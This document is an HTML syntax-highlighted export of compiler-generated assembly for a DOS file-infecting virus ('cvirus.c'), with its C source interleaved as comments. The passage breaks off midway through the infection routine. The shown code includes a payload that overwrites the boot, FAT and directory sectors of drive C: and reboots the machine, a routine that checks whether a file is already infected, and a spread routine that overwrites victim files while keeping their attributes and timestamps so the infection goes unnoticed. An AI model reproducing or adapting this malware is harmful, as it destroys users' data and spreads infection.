<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">    </span><span class="sc9">ifndef</span><span class="sc0">  </span><span class="sc5">??version</span><span class="sc0">
</span><span class="sc5">?debug</span><span class="sc0">  </span><span class="sc9">macro</span><span class="sc0">
    </span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc5">$comm</span><span class="sc0">   </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc9">name</span><span class="sc4">,</span><span class="sc5">dist</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc4">,</span><span class="sc5">count</span><span class="sc0">
    </span><span class="sc9">comm</span><span class="sc0">    </span><span class="sc5">dist</span><span class="sc0"> </span><span class="sc9">name</span><span class="sc4">:</span><span class="sc10">BYTE</span><span class="sc4">:</span><span class="sc5">count</span><span class="sc4">*</span><span class="sc9">size</span><span class="sc0">
    </span><span class="sc9">endm</span><span class="sc0">
    </span><span class="sc9">else</span><span class="sc0">
</span><span class="sc5">$comm</span><span class="sc0">   </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc9">name</span><span class="sc4">,</span><span class="sc5">dist</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc4">,</span><span class="sc5">count</span><span class="sc0">
    </span><span class="sc9">comm</span><span class="sc0">    </span><span class="sc5">dist</span><span class="sc0"> </span><span class="sc9">name</span><span class="sc4">[</span><span class="sc9">size</span><span class="sc4">]:</span><span class="sc10">BYTE</span><span class="sc4">:</span><span class="sc5">count</span><span class="sc0">
    </span><span class="sc9">endm</span><span class="sc0">
    </span><span class="sc9">endif</span><span class="sc0">
    </span><span class="sc5">?debug</span><span class="sc0">  </span><span class="sc5">S</span><span class="sc0"> </span><span class="sc3">"cvirus.c"</span><span class="sc0">
    </span><span class="sc5">?debug</span><span class="sc0">  </span><span class="sc10">C</span><span class="sc0"> </span><span class="sc5">E9A18C4217086376697275732E63</span><span class="sc0">
    </span><span class="sc5">?debug</span><span class="sc0">  </span><span class="sc10">C</span><span class="sc0"> </span><span class="sc5">E90008A41413433A5C54435C494E434C5544455C6469722E68</span><span class="sc0">
    </span><span class="sc5">?debug</span><span class="sc0">  </span><span class="sc10">C</span><span class="sc0"> </span><span class="sc5">E90008A41413433A5C54435C494E434C5544455C646F732E68</span><span class="sc0">
    </span><span class="sc5">?debug</span><span class="sc0">  </span><span class="sc10">C</span><span class="sc0"> </span><span class="sc5">E90008A41415433A5C54435C494E434C5544455C66636E746C2E68</span><span class="sc0">
    </span><span class="sc5">?debug</span><span class="sc0">  </span><span class="sc10">C</span><span class="sc0"> </span><span class="sc5">E90008A41412433A5C54435C494E434C5544455C696F2E68</span><span class="sc0">
    </span><span class="sc5">?debug</span><span class="sc0">  </span><span class="sc10">C</span><span class="sc0"> </span><span class="sc5">E90008A41416433A5C54435C494E434C5544455C7374646172672E</span><span class="sc4">+</span><span class="sc0">
    </span><span class="sc5">?debug</span><span class="sc0">  </span><span class="sc10">C</span><span class="sc0"> </span><span class="sc2">68</span><span class="sc0">
    </span><span class="sc5">?debug</span><span class="sc0">  </span><span class="sc10">C</span><span class="sc0"> </span><span class="sc5">E90008A41415433A5C54435C494E434C5544455C737464696F2E68</span><span class="sc0">
</span><span class="sc5">_TEXT</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
</span><span class="sc5">_TEXT</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc5">DGROUP</span><span class="sc0">  </span><span class="sc9">group</span><span class="sc0">   </span><span class="sc5">_DATA</span><span class="sc4">,</span><span class="sc5">_BSS</span><span class="sc0">
    </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_TEXT</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">DGROUP</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc0">
</span><span class="sc5">d@</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">d@w</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc5">_BSS</span><span class="sc0">    </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'BSS'</span><span class="sc0">
</span><span class="sc5">b@</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">b@w</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0">
</span><span class="sc5">_BSS</span><span class="sc0">    </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc0">
</span><span class="sc5">_screw_virex</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">245</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">35</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">114</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">150</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">84</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">250</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">227</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">188</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">205</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc5">_TEXT</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    void hostile_activity(void)</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_TEXT</span><span class="sc0">
</span><span class="sc5">_hostile_activity</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    {</span><span class="sc0">
   </span><span class="sc1">;        /* Put whatever you feel like doing here...</span><span class="sc0">
   </span><span class="sc1">;           I chose to make this routine trash the victim's boot, FAT, and</span><span class="sc0">
   </span><span class="sc1">;           directory sectors, but you can alter this code however you want,</span><span class="sc0">
   </span><span class="sc1">;           and are encouraged to do so.</span><span class="sc0">
   </span><span class="sc1">;        */</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    #ifdef DEBUG</span><span class="sc0">
   </span><span class="sc1">;        puts("\aAll files infected!");</span><span class="sc0">
   </span><span class="sc1">;        exit(1);</span><span class="sc0">
   </span><span class="sc1">;    #else</span><span class="sc0">
   </span><span class="sc1">;        /* Overwrite five sectors, starting with sector 0, on C:, with the</span><span class="sc0">
   </span><span class="sc1">;           memory at location DS:0000 (random garbage).</span><span class="sc0">
   </span><span class="sc1">;        */</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        abswrite(2, 5, 0, (void *) 0);</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">_abswrite</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        __emit__(0xCD, 0x19);   // Reboot computer</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">205</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">25</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    #endif</span><span class="sc0">
   </span><span class="sc1">;    }</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> 
</span><span class="sc5">_hostile_activity</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">_TEXT</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">78</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">77</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">65</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">78</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc5">_TEXT</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    int infected(char *fname)</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_TEXT</span><span class="sc0">
</span><span class="sc5">_infected</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">36</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    {</span><span class="sc0">
   </span><span class="sc1">;        /* This function determines if fname is infected.  It reads four</span><span class="sc0">
   </span><span class="sc1">;           bytes 28 bytes in from the start and checks them agains the</span><span class="sc0">
   </span><span class="sc1">;           current header.  1 is returned if the file is already infected,</span><span class="sc0">
   </span><span class="sc1">;           0 if it isn't.</span><span class="sc0">
   </span><span class="sc1">;        */</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        register int handle;</span><span class="sc0">
   </span><span class="sc1">;        char virus_signature[35];</span><span class="sc0">
   </span><span class="sc1">;        static char check[] = SIGNATURE;</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        handle = _open(fname, O_RDONLY);</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">__open</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        _read(handle, virus_signature, sizeof(virus_signature));</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">35</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">__read</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        close(handle);</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">_close</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    #ifdef DEBUG</span><span class="sc0">
   </span><span class="sc1">;        printf("Signature for %s:  %.4s\n", fname, &amp;virus_signature[28]);</span><span class="sc0">
   </span><span class="sc1">;    #endif</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        /* This next bit may look really stupid, but it actually saves about</span><span class="sc0">
   </span><span class="sc1">;           100 bytes.</span><span class="sc0">
   </span><span class="sc1">;        */</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        return((virus_signature[28] == check[0]) &amp;&amp; (virus_signature[29] == check[1])</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;               &amp;&amp; (virus_signature[30] == check[2]) &amp;&amp; (virus_signature[31] == check[3]));</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">d@</span><span class="sc4">+</span><span class="sc2">11</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@2@146</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">d@</span><span class="sc4">+</span><span class="sc2">11</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@2@146</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">d@</span><span class="sc4">+</span><span class="sc2">11</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@2@146</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">d@</span><span class="sc4">+</span><span class="sc2">11</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@2@146</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@2@170</span><span class="sc0">
</span><span class="sc5">@2@146</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">@2@170</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    }</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> 
</span><span class="sc5">_infected</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    void spread(char *virus, struct ffblk *victim)</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_TEXT</span><span class="sc0">
</span><span class="sc5">_spread</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">4740</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    {</span><span class="sc0">
   </span><span class="sc1">;        /* This function infects victim with virus.  First, the victim's</span><span class="sc0">
   </span><span class="sc1">;           attributes are set to 0.  Then the virus is copied into</span><span class="sc0">
   </span><span class="sc1">;           the victim's file name.  Its attributes, file date/time, and</span><span class="sc0">
   </span><span class="sc1">;           size are set to that of the victim's, preventing detection, and</span><span class="sc0">
   </span><span class="sc1">;           the files are closed.</span><span class="sc0">
   </span><span class="sc1">;        */</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        register int virus_handle, victim_handle;</span><span class="sc0">
   </span><span class="sc1">;        unsigned virus_size;</span><span class="sc0">
   </span><span class="sc1">;        char virus_code[TOO_SMALL + 1], *victim_name;</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        /* This is used enought to warrant saving it in a separate variable */</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        victim_name = victim-&gt;ff_name;</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">30</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    #ifdef DEBUG</span><span class="sc0">
   </span><span class="sc1">;        printf("Infecting %s with %s...\n", victim_name, virus);</span><span class="sc0">
   </span><span class="sc1">;    #endif</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        /* Turn off all of the victim's attributes so it can be replaced */</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        _chmod(victim_name, 1, 0);</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">__chmod</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        </span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    #ifdef DEBUG</span><span class="sc0">
   </span><span class="sc1">;        puts("Ok so far...");</span><span class="sc0">
   </span><span class="sc1">;    #endif</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        /* Recreate the victim */</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        virus_handle = _open(virus, O_RDONLY);</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">__open</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        victim_handle = _creat(victim_name, victim-&gt;ff_attrib);</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
